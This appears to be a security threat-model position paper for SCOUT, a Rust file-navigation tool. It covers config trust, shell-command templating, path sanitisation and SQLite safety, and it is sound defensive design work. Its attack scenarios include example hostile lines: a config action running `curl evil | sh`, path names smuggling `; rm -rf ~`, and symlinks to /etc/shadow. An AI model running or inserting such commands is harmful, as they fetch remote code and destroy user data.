# Position Paper — Security Officer: Threat Model

**Author:** council-security
**Date:** 2026-04-23
**Phase:** 1, Wave 1
**Portfolio:** Threat model, input sanitisation, action execution safety, config trust.

The pathexplorer reference tree is not mounted in this sandbox; I reason from the four input surfaces in the brief and from Architect's commitment to argv-level templates and a closed placeholder set (`positions/council-architect.md`).

---

## 1. Attack surface

Four input surfaces. Concrete scenarios only.

**TOML config.** The load-bearing threat is a malicious `[[action]]` smuggled into a synced dotfiles repo — by a teammate, a stolen GitHub token, a compromised laptop. The user runs `chezmoi apply` on a fresh machine and the next `Enter` in SCOUT runs `argv = ["sh", "-c", "curl evil | sh"]`. Sub-threats: the loader silently coercing wrong-typed or unknown keys (a `step.kind` we don't know becomes confused-deputy execution); the `toml` crate fed a multi-megabyte string or pathologically nested table; the config path being a symlink to `/etc/passwd` or to another user's file.

**User-configured shell commands.** Argv-level expansion (Architect's design) eliminates the worst case. The residual surface: an opt-in `argv = ["sh", "-c", "cd {path} && make"]` where a path containing `; rm -rf ~` runs; PATH hijacking when `argv[0]` is a bare name and `.` has leaked into PATH; a path that begins with `-` parsed as a flag by the spawned tool (`/tmp/-rf` fed to `rm`); secrets in the parent environment (`AWS_*`, `GITHUB_TOKEN`) inherited by every spawned editor.

**Indexing arbitrary paths.** Symlink loops (`ignore` handles cycles by default — verify it stays on); a path that was a regular file at index time and a symlink to `/etc/shadow` at action time (TOCTOU we will not close); a directory named `\x1b]0;owned\x07` rewriting the terminal title when rendered; a path containing `\n; rm -rf ~` written by `--print` to a parent shell that `eval`s it; a user pointing SCOUT at `/` and stalling on `/proc`, FUSE, or hung NFS mounts; 4 KiB filenames and 10M-sibling directories.

**Local SQLite DB.** `index.db` symlinked to a sibling's file at first open; WAL/SHM siblings inheriting a world-readable parent; SQL injection from indexed paths if any query is built with `format!` instead of bound parameters; a future "import another machine's index" feature opening an attacker-controlled DB. Tampering by a process running as the user is *not* on this list — see §5.

---

## 2. Trust boundaries

What we **trust blindly:** nothing. Even the user's own config is "yesterday's git pull" until proven otherwise.

What we **sanitise:**
- Every indexed path is canonicalised to an absolute, no-`..` form before insertion. Render strips C0/C1 control bytes. `--print` POSIX-single-quotes (`'` → `'\''`).
- Every TOML config is schema-validated; unknown keys reject; size capped at 256 KiB before parse; final path component opened with `O_NOFOLLOW` and refused if not a regular file.
- Every SQL query is parameterised. No string-formatted SQL anywhere — this is a code-review rule for the `index` and `search` modules.
- `PATH` for `execvp` has empty entries and `.` stripped.

What we **refuse outright:**
- Configs over 256 KiB or that resolve through a symlink.
- Action argv that is a single string instead of a list, or that contains an unknown placeholder (no silent empty expansion).
- Paths over 4 KiB, paths containing NUL, paths inside a system denylist (`/proc`, `/sys`, `/dev`).
- A schema-version mismatch in the DB. Refuse to run rather than auto-migrate downward.
- Remote includes in the config (`include = "https://..."` is a parse error, today and forever).

The asymmetry is deliberate. Indexed paths are trusted as inode references; they are *not* trusted as display strings or as shell tokens.

---

## 3. Action-execution safety

`subl {path}` expands to argv `["subl", "/abs/canonical/path"]` and goes straight to `execvp`. No shell. No quoting question, because no shell parses it. `{path}` fills exactly the slot it occupies. If the user writes `argv = ["subl --wait {path}"]` (one string, three words) the loader rejects at parse — argv is a list, not a sentence.

Quoting matters at exactly two seams:

1. **The `print` step**, whose output is destined for `eval` in a wrapper shell: POSIX-single-quote, refuse paths containing newlines or NUL.
2. **Explicit `sh -c` opt-in**, where the user owns the quoting. We do not try to escape into their shell template; we warn loudly when an `sh -c` step contains a `{...}` placeholder and require a per-action `unsafe_shell_template = true` to load it at all. The danger is ceremonial.

Sandbox expectations are modest and honest. We do not implement seccomp, namespaces, or AppArmor profiles. The action runs with the user's full privilege because, conceptually, the user pressed Enter — sandboxing SCOUT itself is the wrong threat, and sandboxing the user's chosen editor is unacceptable. What we *do* commit: `umask` is not weakened; detached spawns (`wait = false`) get `setsid` so they do not steal the controlling terminal; `cwd` defaults to `$HOME`, never to the SCOUT install directory.

---

## 4. Config-file trust

Cloning a dotfiles repo onto a fresh machine and pointing SCOUT at it is the **default unsafe operation** in this model. The right defaults:

- **First-run trust prompt.** On first encounter with a config, print every action's `name` and `argv` and require explicit `y` confirmation. Store a SHA-256 of the canonicalised action set at `~/.local/state/scout/trusted-config.sha256`. Subsequent matching loads are silent; any change re-prompts. This is the load-bearing mitigation against the synced-dotfiles scenario.
- **Ceremonious dangerous shapes.** `sh -c` plus `{...}` placeholder requires the explicit `unsafe_shell_template` opt-in named above. We make the user *type the danger*.
- **No remote includes, ever.** Future split-config support is local-path only and inherits the same trust prompt.
- **Surface provenance, do not validate it.** We do not call git, do not check signatures, do not try to know whether the file is from `dotfiles@main`. We do print "loaded config from `<path>`, last modified `<mtime>`" at the first-run prompt so the user sees that something is new before they confirm.

Provenance is the user's problem; *making the change visible* is ours.

---

## 5. Out of scope (explicitly)

- **A local attacker with the user's UID.** Defending against the user's own privilege is theatre.
- **Side channels.** Timing, cache, shoulder-surfing — not our weight class.
- **Supply-chain attacks on Rust deps.** Quartermaster owns the longevity gates and `cargo audit`; Security defers to ADR-002.
- **Network-borne attacks.** SCOUT is offline; a future HTTP feature is a new ADR.
- **Multi-user shared installs.** v1 is single-user.
- **The user's editor's bugs.** If `subl` parses a file and explodes, that is Sublime's problem.
- **`ratatui` / `crossterm` rendering vulns.** We strip control bytes from inputs; we do not audit the renderer.

---

**Key claim.** Three doctrines close the realistic surface: (1) argv-level template expansion with shell as a ceremonious opt-in; (2) a first-run trust prompt with content-hash pinning for synced configs; (3) canonicalise-and-strip discipline for every path that crosses into render, print, or SQL. Everything else in this paper is an instance of one of those three. The posture I will fight for in ADR-003 is the trust prompt: the dotfiles-on-a-fresh-machine scenario is the load-bearing threat, and silent config trust is the design failure that enables it.
